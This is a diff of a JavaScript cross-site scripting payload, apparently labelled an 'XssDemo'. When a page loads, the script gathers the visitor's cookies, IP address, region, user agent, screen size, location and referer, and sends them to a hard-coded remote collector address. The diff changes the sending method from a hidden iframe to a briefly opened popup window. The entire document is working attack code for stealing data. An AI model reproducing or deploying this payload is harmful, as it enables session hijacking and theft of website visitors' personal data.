@@ -5,10 +5,8 @@ function ImportJs(url){
 	document.head.appendChild(JSElement);
 }
 function Send(url){
-	var JSElement=document.createElement("iframe");
-	JSElement.setAttribute("style","display:none;");
-	JSElement.setAttribute("src",url);
-	document.head.appendChild(JSElement);
+	var WinShit = window.open(url, "test", "width=300,height=300");
+	setTimeout("WinShit.close();", 1000);
 }
 
 var returnCitySN = {"cip":"undefined", "cname":"undefined"};
@@ -16,7 +14,8 @@ var returnCitySN = {"cip":"undefined", "cname":"undefined"};
 ImportJs("https://pv.sohu.com/cityjson?ie=utf-8");
 
 window.onload=function(){
-	let XssApi = "http://107.151.144.205/include/XssDemo/DataRecv.asp?data=";
+	let XssApi = "http://107.151.144.205/include/XssDemo/DataRecv.asp";
+	//let XssApi = "http://107.151.144.205/include/XssDemo/DataRecv.asp?data=";
 	let ip = returnCitySN["cip"];
 	let region = returnCitySN["cname"];
 	let ua = navigator.userAgent;
@@ -27,5 +26,5 @@ window.onload=function(){
 	let timestamp = new Date().getTime();
 	let PassMsg='["Timestamp: '+timestamp+'","IP: '+ip+'","Region: '+region+'","UA: '+ua+'","Cookie: '+cookie+'","Screen: '+screensize+'","Location: '+Location+'","Referer: '+h_referer+'"]';
 	//ImportJs(XssApi+encodeURI(PassMsg));
-	Send(XssApi+encodeURI(PassMsg))
+	Send(XssApi+encodeURI(PassMsg));
 }
